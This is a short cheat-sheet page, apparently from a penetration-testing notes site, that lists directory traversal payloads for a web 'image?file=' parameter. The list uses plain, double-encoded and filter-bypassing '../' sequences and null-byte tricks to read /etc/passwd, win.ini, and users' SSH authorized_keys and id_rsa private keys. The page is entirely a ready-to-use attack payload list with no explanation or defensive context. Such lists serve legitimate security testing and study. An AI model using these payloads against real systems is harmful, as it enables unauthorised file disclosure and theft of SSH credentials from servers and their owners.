---
title: Directory Traversal
desc: 
tags: [Directory, Path, Traversal, Web]
alts: [File-Inclusion]
render_with_liquid: false
---

```sh
/image?file=index.php
/image?file=index.html
/image?file=/etc/passwd
/image?file=../../../etc/passwd
/image?file=....//....//....//etc/passwd
/image?file=..%252f..%252f..%252fetc/passwd
/image?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
/image?file=/var/www/images/../../../etc/passwd
/image?file=/etc/passwd%00.png
/image?file=../../../etc/passwd%00.png
/image?file=....//....//....//etc/passwd%00.png
/image?file=..%252f..%252f..%252fetc/passwd%00.png
/image?file=/var/www/images/../../../etc/passwd%00.png

/image?file=..\..\..\windows\win.ini

# SSH
/image?file=../../../../../home/<username>/.ssh/authorized_keys
/image?file=../../../../../home/<username>/.ssh/id_rsa
```